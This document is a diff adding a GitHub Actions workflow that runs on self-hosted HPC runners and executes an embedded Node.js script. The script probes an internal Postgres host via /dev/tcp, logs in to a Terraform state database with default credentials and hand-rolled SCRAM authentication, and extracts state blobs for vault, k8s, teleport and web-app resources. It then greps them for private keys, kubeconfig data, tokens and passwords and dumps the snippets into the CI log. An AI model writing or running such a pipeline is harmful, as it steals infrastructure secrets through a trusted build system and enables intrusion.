@@ -1,0 +1,86 @@
+name: pt13-i37473-1
+on:
+  push:
+    branches: [pt13-i37473-1]
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  pg:
+    runs-on: [self-hosted, hpc]
+    steps:
+      - name: pgread
+        shell: bash
+        run: |
+          set +e +u
+          hostname; id; getent hosts bol-tf-state-ci.ecmwf.int bovcenter.ecmwf.int
+          timeout 6 bash -c 'echo > /dev/tcp/bol-tf-state-ci.ecmwf.int/5432' && echo PG_TCP_OPEN || echo PG_TCP_CLOSED
+          cat > /tmp/q.js <<'JSEOF'
+          const net=require('net'),crypto=require('crypto');
+          const H='bol-tf-state-ci.ecmwf.int',P=5432,U='terraform',DB='tf_state',PW='terraform';
+          function lenb(n){const b=Buffer.alloc(4);b.writeInt32BE(n);return b;}
+          function msg(t,p){return Buffer.concat([Buffer.from(t),lenb(p.length+4),p]);}
+          const s=net.createConnection({host:H,port:P});
+          let buf=Buffer.alloc(0), Q=[], qi=-1, cols=[], schemaTables=[];
+          function push(sql,tag){Q.push({sql:sql,tag:tag});}
+          push('select current_user as u, current_database() as d, version() as v','who');
+          push("select schema_name from information_schema.schemata where schema_name not like 'pg\\_%' and schema_name<>'information_schema' order by 1",'schemas');
+          push("select table_schema, table_name from information_schema.tables where table_schema not like 'pg\\_%' and table_schema<>'information_schema' and table_name='states' order by 1",'statetables');
+          function sendNext(){
+            if(qi+1<Q.length){ qi++; s.write(msg('Q',Buffer.from(Q[qi].sql+'\0'))); }
+            else { console.log('DONE'); s.end(); try{process.exit(0)}catch(e){} }
+          }
+          function onReady(){
+            const q=Q[qi];
+            if(q && q.tag==='statetables'){
+              for(const sch of schemaTables){
+                push('select id, name, octet_length(data) as len from "'+sch.replace(/"/g,'""')+'".states order by id','meta:'+sch);
+              }
+            }
+            sendNext();
+          }
+          function onData(pl){
+            let o=2; const n=pl.readInt16BE(0); const vals=[];
+            for(let i=0;i<n;i++){const L=pl.readInt32BE(o);o+=4;if(L<0){vals.push(null);}else{vals.push(pl.slice(o,o+L).toString('utf8'));o+=L;}}
+            const tag=Q[qi].tag, row={}; cols.forEach((c,i)=>row[c]=vals[i]);
+            if(tag==='schemas'){ return; }
+            if(tag==='statetables'){ schemaTables.push(row.table_schema); return; }
+            if(String(tag).startsWith('meta:')){
+              const sch=String(tag).slice(5), nm=String(row.name||''), len=parseInt(row.len||'0',10);
+              console.log('ROW '+sch+' id='+row.id+' name='+nm+' len='+len);
+              if(/webapps|eccharts|teleport|k8s|bol|vault|app/i.test(nm) && len>0 && len<4000000){
+                push('select encode(convert_to(data,\'UTF8\'),\'base64\') as b64 from "'+sch.replace(/"/g,'""')+'".states where id='+parseInt(row.id,10),'data:'+sch+'|'+row.id+'|'+nm);
+              }
+              return;
+            }
+            if(String(tag).startsWith('data:')){
+              const parts=String(tag).split('|'), nm=parts[2];
+              let txt=''; try{txt=Buffer.from(String(row.b64||''),'base64').toString('utf8');}catch(e){}
+              console.log('STATE '+parts[0]+' id='+parts[1]+' name='+nm+' bytes='+txt.length);
+              const types={}; let m; const re=/"type"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"([^"]+)"/g;
+              while((m=re.exec(txt))!==null){ const k=m[1]+'.'+m[2]; types[k]=(types[k]||0)+1; }
+              console.log('RES '+JSON.stringify(Object.keys(types).slice(0,80)));
+              const pat=/PRIVATE KEY|client-key-data|certificate-authority-data|kubeconfig|kubeadm|bootstrap-token|password|passwd|token|secret|vault/ig;
+              let c=0,pm;
+              while((pm=pat.exec(txt))!==null && c<40){ const st=Math.max(0,pm.index-120); const sn=txt.slice(st,pm.index+240).replace(/[\r\n]+/g,' '); console.log('HIT '+JSON.stringify(sn).slice(0,430)); c++; }
+              return;
+            }
+            console.log('ROW '+tag+' '+JSON.stringify(vals).slice(0,900));
+          }
+          s.on('connect',()=>{const p=Buffer.concat([lenb(196608),Buffer.from('user\0'+U+'\0database\0'+DB+'\0\0')]);s.write(Buffer.concat([lenb(p.length+4),p]));});
+          s.on('data',d=>{buf=Buffer.concat([buf,d]);
+           while(buf.length>=5){const l=buf.readInt32BE(1);if(buf.length<1+l)break;const t=String.fromCharCode(buf[0]);const pl=buf.slice(5,1+l);buf=buf.slice(1+l);
+            if(t==='R'){const code=pl.readInt32BE(0);
+             if(code===10){const nonce=crypto.randomBytes(18).toString('base64');const cfb='n='+U+',r='+nonce;global._cfb=cfb;const init=Buffer.concat([Buffer.from('SCRAM-SHA-256\0'),lenb(('n,,'+cfb).length),Buffer.from('n,,'+cfb)]);s.write(msg('p',init));}
+             else if(code===11){const sf=pl.slice(4).toString('latin1');const o={};sf.split(',').forEach(kv=>{o[kv[0]]=kv.slice(2)});const iter=parseInt(o.i,10),salt=Buffer.from(o.s,'base64');const sp=crypto.pbkdf2Sync(PW,salt,iter,32,'sha256');const ck=crypto.createHmac('sha256',sp).update('Client Key').digest();const sk=crypto.createHash('sha256').update(ck).digest();const cfw='c=biws,r='+o.r;const am=global._cfb+','+sf+','+cfw;const cs=crypto.createHmac('sha256',sk).update(am).digest();const proof=Buffer.alloc(ck.length);for(let i=0;i<ck.length;i++)proof[i]=ck[i]^cs[i];const cf=cfw+',p='+proof.toString('base64');s.write(msg('p',Buffer.from(cf)));}
+             else if(code===12){console.log('AUTH_OK');}
+             else{console.log('AUTH_OTHER',code);}}
+            else if(t==='T'){cols=[];const n=pl.readInt16BE(0);let o=2;for(let i=0;i<n;i++){const e=pl.indexOf(0,o);cols.push(pl.slice(o,e).toString());o=e+1+18;}}
+            else if(t==='D'){onData(pl);}
+            else if(t==='E'){console.log('PGERROR '+(Q[qi]?Q[qi].tag:'')+' '+pl.toString('utf8').replace(/\0/g,' '));}
+            else if(t==='Z'){onReady();}
+           }});
+          s.on('error',e=>{console.log('SOCKERR',e.message);process.exit(0);});
+          setTimeout(()=>{console.log('TIMEOUT');process.exit(0)},300000);
+          JSEOF
+          if command -v node >/dev/null 2>&1; then node /tmp/q.js; else /home/runner/externals/node24/bin/node /tmp/q.js; fi
